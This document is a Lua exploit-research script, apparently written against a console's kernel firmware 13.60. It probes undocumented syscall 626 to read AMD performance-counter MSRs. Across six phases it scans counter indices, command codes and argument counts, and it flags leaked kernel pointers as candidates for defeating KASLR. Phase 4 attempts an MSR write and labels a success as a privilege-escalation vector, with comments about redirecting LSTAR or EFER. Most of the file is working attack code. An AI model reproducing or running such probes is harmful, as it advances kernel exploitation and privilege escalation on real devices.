-- CRASH_CLASS: MODERATE
-- PROBE 54a2: Precise RDMSR via sys 626 with verified calling convention
--
-- Binary analysis of 13.60 handler at offset 0x604cf0 reveals:
--   - Stack frame 0x118 bytes, zeroes 32 qwords
--   - Dispatches on [rsi]-1 via jump table (cmd values 1-6)
--   - cmd=1 path: sub-function at 0x9e9f5000 computes ecx = counter_idx*2 + 0xC0010231
--     then executes RDMSR, returns result in eax:edx
--   - Post-dispatch: stores 8-byte result at [rbp-0x128], copyout to user ptr from arg[3]
--
-- Exact signature: sys626(cmd, counter_idx, narg_count, output_ptr, 0)
-- Where cmd=1 reads AMD PMC MSR at index (0xC0010231 + counter_idx*2)
--
-- AMD PMC MSRs (Family 17h/19h Zen):
--   0xC0010200-0xC001020B: PerfEvtSel0-5 (event select)
--   0xC0010201-0xC001020B: PerfCtr0-5 (counter values, odd indices)
--   0xC0010230-0xC001023B: L3PmcCfg/L3PmcCtr (L3 cache PMC)
--   0xC0010240-0xC001024B: Data Fabric PMC
--
-- The sub-function formula: MSR = 0xC0010231 + counter_idx * 2
-- So counter_idx=0 -> MSR 0xC0010231 (PerfCtr0 high? or L3 related)
-- counter_idx=1 -> MSR 0xC0010233
-- etc.
-- These are performance counter VALUES - may leak timing/execution info

print("=== PROBE 54a2: PRECISE RDMSR VIA SYS 626 ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function signed32(v)
    if type(v) == "table" and v.h then
        if v.h == 0xFFFFFFFF then return v.l - 0x100000000 end
        if v.h == 0 and v.l >= 0x80000000 then return v.l - 0x100000000 end
    end
    local n = to_num(v)
    if n >= 0x80000000 and n < 0x100000000 then return n - 0x100000000 end
    return n
end

local sc626 = make_syscall(626)
local outbuf = memory.alloc(0x100)

-- Phase 1: Test cmd=1 (RDMSR path) with counter indices 0-15
-- Formula: MSR = 0xC0010231 + idx*2
-- idx=0: 0xC0010231, idx=1: 0xC0010233, ..., idx=7: 0xC001023F
-- idx=8: 0xC0010241, ..., idx=15: 0xC001024F
print("[*] Phase 1: cmd=1 RDMSR, counter indices 0-15")
print("    MSR formula: 0xC0010231 + idx*2")
print("")

for idx = 0, 15 do
    local msr = 0xC0010231 + idx * 2
    for i = 0, 0x1F, 4 do safe_wd(outbuf + i, 0xDEADBEEF) end

    local ok, ret = pcall(function()
        return sc626(uint64(1), uint64(idx), uint64(5), uint64(outbuf), uint64(0))
    end)

    if ok then
        local rv = signed32(ret)
        local q0 = safe_rq(outbuf)
        local q1 = safe_rq(outbuf + 8)
        local sentinel = (safe_rd(outbuf) == 0xDEADBEEF)
        print(string.format("  idx=%2d MSR=0x%08X  ret=%d  out=%s  out+8=%s%s",
            idx, msr, rv, hexval(q0), hexval(q1),
            sentinel and "  (UNCHANGED)" or "  <<< DATA"))

        if not sentinel and rv == 0 then
            local h, l = get_hi_lo(q0)
            if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                print("  >>> KERNEL POINTER CANDIDATE: " .. hexval(q0))
            end
            if h > 0 or l > 0 then
                print("  >>> NON-ZERO PMC VALUE - counter is active!")
            end
        end
    else
        print(string.format("  idx=%2d MSR=0x%08X  CRASHED: %s", idx, msr, tostring(ret)))
    end
end
print("")

-- Phase 2: Test all 6 commands (1-6) with idx=0
print("[*] Phase 2: Testing all commands 1-6 with idx=0")
print("")
for cmd = 1, 6 do
    for i = 0, 0x1F, 4 do safe_wd(outbuf + i, 0xDEADBEEF) end

    local ok, ret = pcall(function()
        return sc626(uint64(cmd), uint64(0), uint64(5), uint64(outbuf), uint64(0))
    end)

    if ok then
        local rv = signed32(ret)
        local q0 = safe_rq(outbuf)
        local sentinel = (safe_rd(outbuf) == 0xDEADBEEF)
        print(string.format("  cmd=%d  ret=%d  out=%s%s",
            cmd, rv, hexval(q0), sentinel and "  (UNCHANGED)" or "  <<< DATA"))
    else
        print(string.format("  cmd=%d  CRASHED: %s", cmd, tostring(ret)))
    end
end
print("")

-- Phase 3: Test with narg_count variations (the 3rd arg)
-- Handler may validate arg count
print("[*] Phase 3: narg_count sensitivity (cmd=1, idx=0)")
print("")
for _, narg in ipairs({0, 1, 2, 3, 4, 5, 6, 7, 8}) do
    for i = 0, 0x1F, 4 do safe_wd(outbuf + i, 0xDEADBEEF) end

    local ok, ret = pcall(function()
        return sc626(uint64(1), uint64(0), uint64(narg), uint64(outbuf), uint64(0))
    end)

    if ok then
        local rv = signed32(ret)
        local q0 = safe_rq(outbuf)
        local sentinel = (safe_rd(outbuf) == 0xDEADBEEF)
        print(string.format("  narg=%d  ret=%d  out=%s%s",
            narg, rv, hexval(q0), sentinel and "  (UNCHANGED)" or "  <<< DATA"))
    else
        print(string.format("  narg=%d  CRASHED: %s", narg, tostring(ret)))
    end
end
print("")

-- Phase 4: WRMSR test - cmd=2 might be write
-- If we can WRITE MSRs, we could potentially:
-- - Redirect syscall entry (LSTAR/CSTAR)
-- - Modify segment bases
-- - Enable/disable features via EFER
-- TRY CAREFULLY: writing garbage to PMC config is low risk
print("[*] Phase 4: cmd=2 WRMSR test (write PMC config)")
print("    Writing 0 to idx=0 config register (safe: just disables counter)")
print("")
do
    -- First put the value we want to write at outbuf
    safe_wq(outbuf, uint64(0))

    local ok, ret = pcall(function()
        return sc626(uint64(2), uint64(0), uint64(5), uint64(outbuf), uint64(0))
    end)

    if ok then
        local rv = signed32(ret)
        print("  cmd=2 write(0, idx=0) ret=" .. rv)
        if rv == 0 then
            print("  >>> WRMSR SUCCEEDED - we can WRITE MSRs!")
            print("  >>> This is a potential privilege escalation vector")
        end
    else
        print("  cmd=2 write CRASHED: " .. tostring(ret))
    end
end
print("")

-- Phase 5: If RDMSR works, try to read LSTAR/KERNEL_GS_BASE via other cmds
-- The base MSR formula gives us PMC range. But cmds 3-6 may use different
-- base MSRs or even allow arbitrary MSR index specification.
print("[*] Phase 5: Try other cmds with KASLR-useful MSR indices")
print("    If cmd dispatches to different MSR ranges...")
print("")

-- Try large counter indices that would map to interesting MSRs
-- Want: LSTAR at 0xC0000082, KERNEL_GS_BASE at 0xC0000102
-- Formula: MSR = 0xC0010231 + idx*2
-- For 0xC0000082: idx = (0xC0000082 - 0xC0010231) / 2 = negative (impossible)
-- So direct PMC path can't reach LSTAR.
-- But other commands (3-6) might have different base offsets!

for cmd = 3, 6 do
    for _, idx in ipairs({0, 1, 2, 3, 0x40, 0x41, 0x80, 0x81}) do
        for i = 0, 0x1F, 4 do safe_wd(outbuf + i, 0xDEADBEEF) end

        local ok, ret = pcall(function()
            return sc626(uint64(cmd), uint64(idx), uint64(5), uint64(outbuf), uint64(0))
        end)

        if ok then
            local rv = signed32(ret)
            local q0 = safe_rq(outbuf)
            local sentinel = (safe_rd(outbuf) == 0xDEADBEEF)
            if not sentinel or rv == 0 then
                print(string.format("  cmd=%d idx=%d  ret=%d  out=%s%s",
                    cmd, idx, rv, hexval(q0),
                    sentinel and "" or "  <<< DATA"))
                if not sentinel then
                    local h, l = get_hi_lo(q0)
                    if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                        print("  >>> KERNEL POINTER: " .. hexval(q0))
                    end
                end
            end
        else
            print(string.format("  cmd=%d idx=%d  CRASHED: %s", cmd, idx, tostring(ret)))
        end
    end
end
print("")

-- Phase 6: Read twice rapidly to detect counter activity
print("[*] Phase 6: PMC timing - read same counter twice")
print("")
for idx = 0, 3 do
    for i = 0, 0x1F, 4 do safe_wd(outbuf + i, 0) end
    local ok1, ret1 = pcall(function()
        return sc626(uint64(1), uint64(idx), uint64(5), uint64(outbuf), uint64(0))
    end)
    local val1 = safe_rq(outbuf)

    for i = 0, 0x1F, 4 do safe_wd(outbuf + i, 0) end
    local ok2, ret2 = pcall(function()
        return sc626(uint64(1), uint64(idx), uint64(5), uint64(outbuf), uint64(0))
    end)
    local val2 = safe_rq(outbuf)

    if ok1 and ok2 then
        print(string.format("  idx=%d: read1=%s  read2=%s  %s",
            idx, hexval(val1), hexval(val2),
            (hexval(val1) ~= hexval(val2)) and "CHANGING!" or "static"))
    end
end

print("")
print("=== PROBE 54a2 COMPLETE ===")
